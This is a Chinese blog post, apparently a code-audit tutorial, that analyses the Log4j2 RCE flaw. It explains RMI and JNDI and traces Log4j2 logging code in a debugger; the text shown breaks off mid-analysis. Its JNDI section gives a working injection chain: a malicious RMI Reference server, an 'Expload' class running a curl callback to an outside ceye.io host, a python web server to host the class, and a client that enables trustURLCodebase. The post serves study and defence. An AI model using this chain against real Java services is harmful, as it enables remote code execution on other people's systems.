@@ -1,0 +1,419 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Java代码审计-Log4j2漏洞分析 | Time'Blog</title><meta name="keywords" content="JAVA"><meta name="author" content="Time"><meta name="copyright" content="Time"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0X01 Log4j2 组件Log4j2 日志组件是一款比较优秀的 Java程序日志监控组件，同属于 Java全生态中的基础组件之一。最近被爆出 RCE 漏洞，据不完全统计，影响多达60644个开源软件，涉及相关版本软件包更是达到321094个。且利用方式简单，之前测 XSS 的点，都可以用来插入恶意代码，被称为核弹级漏洞。 0X02 RMIRMI 概念要分析 Log4j2 漏洞 就得了解一下 R">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计-Log4j2漏洞分析">
+<meta property="og:url" content="https://timeshu.github.io/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Time&#39;Blog">
+<meta property="og:description" content="0X01 Log4j2 组件Log4j2 日志组件是一款比较优秀的 Java程序日志监控组件，同属于 Java全生态中的基础组件之一。最近被爆出 RCE 漏洞，据不完全统计，影响多达60644个开源软件，涉及相关版本软件包更是达到321094个。且利用方式简单，之前测 XSS 的点，都可以用来插入恶意代码，被称为核弹级漏洞。 0X02 RMIRMI 概念要分析 Log4j2 漏洞 就得了解一下 R">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images.pexels.com/photos/8761731/pexels-photo-8761731.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500">
+<meta property="article:published_time" content="2022-02-08T21:41:45.000Z">
+<meta property="article:modified_time" content="2022-02-18T07:36:03.594Z">
+<meta property="article:author" content="Time">
+<meta property="article:tag" content="JAVA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.pexels.com/photos/8761731/pexels-photo-8761731.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timeshu.github.io/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?5dd9b277051da31b80703896f0394cce";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java代码审计-Log4j2漏洞分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-18 15:36:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images.pexels.com/photos/8761731/pexels-photo-8761731.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Time'Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java代码审计-Log4j2漏洞分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-08T21:41:45.000Z" title="发表于 2022-02-09 05:41:45">2022-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-18T07:36:03.594Z" title="更新于 2022-02-18 15:36:03">2022-02-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java代码审计-Log4j2漏洞分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/02/09/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0X01-Log4j2-组件"><a href="#0X01-Log4j2-组件" class="headerlink" title="0X01 Log4j2 组件"></a>0X01 Log4j2 组件</h1><p>Log4j2 日志组件是一款比较优秀的 Java程序日志监控组件，同属于 Java全生态中的基础组件之一。最近被爆出 <code>RCE</code> 漏洞，据不完全统计，影响多达60644个开源软件，涉及相关版本软件包更是达到321094个。且利用方式简单，之前测 XSS 的点，都可以用来插入恶意代码，被称为<code>核弹级漏洞</code>。</p>
+<h1 id="0X02-RMI"><a href="#0X02-RMI" class="headerlink" title="0X02 RMI"></a>0X02 RMI</h1><h2 id="RMI-概念"><a href="#RMI-概念" class="headerlink" title="RMI 概念"></a>RMI 概念</h2><p>要分析 Log4j2 漏洞 就得了解一下 RMI 和 JNDI。</p>
+<p>RMI 全称 Remote Method Invocation，是 JAVA 实现远程过程调用的应用程序编程接口，存储于 java.rmi 包中，使用期方法调用对象时，必须实现 Remote远程接口。它可以让客户机上运行的程序调用远程服务器上的对象。而远程方法调用的特性可以让开发者能够在网络环境中分布操作。RMI 宗旨就是尽可能简化远程接口对象的使用。</p>
+<h2 id="RMI-三层架构"><a href="#RMI-三层架构" class="headerlink" title="RMI 三层架构"></a>RMI 三层架构</h2><ul>
+<li>客户端<ul>
+<li>存根/桩(Stub)：远程对象在客户端上的代理。</li>
+<li>远程引用层(Remote Reference Layer)：解析并执行远程引用协议。</li>
+<li>传输层(Transport)：发送调用、传递远程方法参数、接收远程方法执行结果。</li>
+</ul>
+</li>
+<li>服务端<ul>
+<li>骨架(Skeleton)：读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。</li>
+<li>远程引用层(Remote Reference Layer)：处理远程引用后向骨架发送远程方法调用。</li>
+<li>传输层(Transport)：监听客户端的入站连接，接收并转发调用到远程引用层。</li>
+</ul>
+</li>
+<li>注册表<ul>
+<li>注册中心(Registry)：以URL形式注册远程对象，并向客户端回复对远程对象的引用。</li>
+</ul>
+</li>
+</ul>
+<p>流程图-引用先知社区小阳大佬的图</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l5tyd5j30vt0jbtbf.jpg" alt="image-20220212042508121"></p>
+<p>觉得上图太复杂可以看这幅图-引用先知社区大佬ghtwf01</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l4avrzj30py0f8t9q.jpg" alt="image-20220212042714950"></p>
+<h2 id="代码例子"><a href="#代码例子" class="headerlink" title="代码例子"></a>代码例子</h2><h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>先编写一个远程接口</p>
+<ul>
+<li>该接口需要继承 Remote 类，该类仅表示 RMI 标识接口，说明可进行 RMI JAVA 虚拟机调用</li>
+<li>需要声明 java.rmi.RemoteException 报错,因 RMI 通信本质是基于 “网络传输”</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface HelloWorld extends Remote {</span><br><span class="line">    public String hello() throws RemoteException;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>远程接口实现类</p>
+<ul>
+<li>需要继承 UnicastRemoteObject 类，用于生成 Stub(存根) 和 Skeleton(骨架)<ul>
+<li>Stub 可以看作远程对象在本地的一个代理，囊括了远程对象的具体信息，客户端可以通过这个代理和服务端进行交互。</li>
+<li>Skeleton 可以看作为服务端的一个代理，用来处理Stub发送过来的请求，然后去调用客户端需要的请求方法，最终将方法执行结果返回给 Stub 。</li>
+</ul>
+</li>
+<li>构造函数需要抛出 java.rmi.RemoteException 报错,同时使用 super() 关键词调用父类构造函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIHelloWorld extends UnicastRemoteObject implements HelloWorld {</span><br><span class="line">    protected RMIHelloWorld() throws RemoteException{</span><br><span class="line">        super();</span><br><span class="line">        System.out.println("RMIServer构造函数运行");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public String hello() throws RemoteException{</span><br><span class="line">        System.out.println("RMIServer接口调用成功");</span><br><span class="line">        return "RMIServer接口调用成功";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务端部署代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIS {</span><br><span class="line">    public static void main(String[] args) throws RemoteException {</span><br><span class="line">        RMIHelloWorld hello = new RMIHelloWorld();//创建远程对象</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);//创建注册表</span><br><span class="line">        registry.rebind("hello",hello);//将远程对象注册到注册表里面，并且设置值为hello</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务端配置完成后， RMIS 将提供的服务注册在 RMIService 上，并公开了固定路径，让客户端去访问。</p>
+<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package RMIClient;</span><br><span class="line"></span><br><span class="line">import RMIServer.HelloWorld;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RMIClient {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        //获取远程主机对象</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);</span><br><span class="line"></span><br><span class="line">        // 利用注册表的代理去查询远程注册表中名为hello的对象</span><br><span class="line">        HelloWorld h = (HelloWorld) registry.lookup("hello");</span><br><span class="line"></span><br><span class="line">        // 调用远程方法</span><br><span class="line">        String hello = h.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>客户端只需要调用 java.rmi.Naming.lookup 函数，通过公开的路径从RMIService服务器上拿到对应接口的实现类， 之后通过本地接口即可调用远程对象的方法 .</p>
+<p>首先我们启动服务端</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l4xzg8j31040l3ju3.jpg" alt="image-20220212050244178"></p>
+<p>可以看见服务端启动成功，并打印了构造函数的内容。</p>
+<p>然后启动客户端</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l2hvq9j30zu0jxtbk.jpg" alt="image-20220212050406054"></p>
+<p>成功调用了 hello 方法。</p>
+<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>上面由于做测试，我是分成多个文件编写的，有点麻烦，可以将服务端代码写在一个文件里面。</p>
+<p>服务端代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIS {</span><br><span class="line">    public interface HelloWorld extends Remote{</span><br><span class="line">        public String hello() throws RemoteException;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public class RMIHelloWorld extends UnicastRemoteObject implements HelloWorld{</span><br><span class="line">        protected RMIHelloWorld() throws RemoteException{</span><br><span class="line">            super();</span><br><span class="line">            System.out.println("RMIServer");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public String hello() throws RemoteException{</span><br><span class="line">            System.out.println("RMIServer接口");</span><br><span class="line">            return "RMIServer接口";</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception{</span><br><span class="line">        RMIHelloWorld hello = new RMIHelloWorld();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        registry.rebind("hello",hello);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        new RMIS().start();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>客户端代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class RMIClient {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);</span><br><span class="line"></span><br><span class="line">        //RMIS.HelloWorld h = (RMIS.HelloWorld) Naming.lookup("rmi://127.0.0.1:1099/hello");</span><br><span class="line">        //注意 这里接口得和服务端一致</span><br><span class="line">        RMIS.HelloWorld h = (RMIS.HelloWorld) registry.lookup("hello");</span><br><span class="line"></span><br><span class="line">        String hello = h.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>服务端启动</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l32ij7j315h0j6gob.jpg" alt="image-20220212050648257"></p>
+<p>客户端启动，成功调用了 hello 资源</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l3i18jj310x0je76s.jpg" alt="image-20220212050734053"></p>
+<p>大致了解了 RMI 整个流程 ， 其他的就不再深入，留个坑先。</p>
+<h1 id="0X03-JNDI"><a href="#0X03-JNDI" class="headerlink" title="0X03 JNDI"></a>0X03 JNDI</h1><p>JNDI 是 Java 命名和目录接口，全称（Java Naming and Directory Interface，缩写 JNDI ），是 Java 的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<h2 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p><code>JNDI</code>注入简单来说就是在<code>JNDI</code>接口在初始化时，如：<code>InitialContext.lookup(URI)</code>，如果URI可控，那么客户端就可能会被攻击。</p>
+<p>通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定从远程加载构造的恶意<code>Factory</code>类，客户端在进行<code>lookup</code>的时候，会从远程动态加载攻击者构造的恶意<code>Factory</code>类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。</p>
+<ul>
+<li><code>className</code> - 远程加载时所使用的类名</li>
+<li><code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</li>
+<li><code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li>
+</ul>
+<p>由于<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类，故不能作为远程对象bind到注册中心，所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p>
+<p>服务端配置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer {</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {</span><br><span class="line">    	//创建注册表</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference("Expload", "Expload", "http://127.0.0.1:80");</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);//封装对象</span><br><span class="line">        registry.bind("exp",referenceWrapper); //将封装的对象绑定到 exp 上</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>创建一个恶意代码执行类  expload </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">public class Expload {</span><br><span class="line">    public Expload() throws Exception{</span><br><span class="line">        Runtime.getRuntime().exec("curl xxxx.ceye.io");</span><br><span class="line">        System.out.println("expload攻击");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>编译成 class 文件，创建一个小型的web服务器,需在 class 文件目录下创建</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m http.server 80  //创建小型web服务器</span><br><span class="line"></span><br><span class="line">javac Expload  //编译java文件</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogmlqi7j20uq02gt94.jpg" alt="image-20220213051317682"></p>
+<p>客户端配置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class JNDI_Exp {</span><br><span class="line">    public static void main(String[] args) throws NamingException {</span><br><span class="line">    	//版本过高，需要人为设定 rmi 或 jndi 为true</span><br><span class="line">        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");</span><br><span class="line">        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");</span><br><span class="line">        new InitialContext().lookup("rmi://127.0.0.1:1099/exp");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功调用</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogdujebj21ba0u0gr2.jpg" alt="image-20220213051540667"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogkby63j22io0qgdih.jpg" alt="image-20220213051609667"></p>
+<p>大致了解了 RMI 和 JNDI 的用法，可以开始分析一波 log4j2 漏洞原理。</p>
+<h1 id="0X04-环境搭建"><a href="#0X04-环境搭建" class="headerlink" title="0X04 环境搭建"></a>0X04 环境搭建</h1><p>在网上有现成的漏洞环境，这里就不在详细赘述。</p>
+<p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/haigeek/Log4j2_RCE">https://github.com/haigeek/Log4j2_RCE</a></p>
+<p>IDEA导入即可。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l1qn6nj31r00u0tc6.jpg" alt="image-20220209054419236"></p>
+<h1 id="0X05-漏洞分析"><a href="#0X05-漏洞分析" class="headerlink" title="0X05 漏洞分析"></a>0X05 漏洞分析</h1><p>断点</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog9ymltj20mo07uwf5.jpg" alt="image-20220218131441283"></p>
+<p>跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogij1txj20ys039gm1.jpg" alt="image-20220218131538411"></p>
+<p>logIfEnabled 判断日志是否开启，调用 isEnabled 判断，返回true，会调用 logMessage , 跟进 isEnabled</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog91kc1j213303174v.jpg" alt="image-20220218132154239"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogivjzbj212e08pjsq.jpg" alt="image-20220218132706187"></p>
+<p>红框中 this.intLever 是 log4j2 默认设置的日志等级，用户也可修改 默认是 200</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog877ztj20pv0f7wg7.jpg" alt="image-20220218133248862"></p>
+<p>判断 &gt;= 200 即日志成功开启, 返回 ture，随后调用 logMessage</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogfm0kyj211x03xaar.jpg" alt="image-20220218133544587"></p>
+<p>messageFactory.newMessage 对数据进行参数化，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogohqv3j20y70ictbd.jpg" alt="image-20220218134307319"></p>
+<p>调用 logMessageTrackRecursion 递归处理日志</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogm69oyj20y608lq43.jpg" alt="image-20220218134652236"></p>
+<p>跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogjcl1rj211l075wg2.jpg" alt="image-20220218135004222"></p>
+<p>获取日志打印策略 getReliabilityStrategy ，跟进 log</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhpc4ctrdj214x0fajux.jpg" alt="image-20220218135347899"></p>
+<p>创建 logEvent，然后调用重载方法 log 处理 logEvent 信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhognje4jj211305a3zb.jpg" alt="image-20220218135520091"></p>
+<p>继续跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogcbu1kj213f05cjs6.jpg" alt="image-20220218135720629"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogda8qhj213406ogmi.jpg" alt="image-20220218135801326"></p>
+<p>加锁 callAppender 一直跟进带 callAppender 的方法，一直到 tryAppend</p>
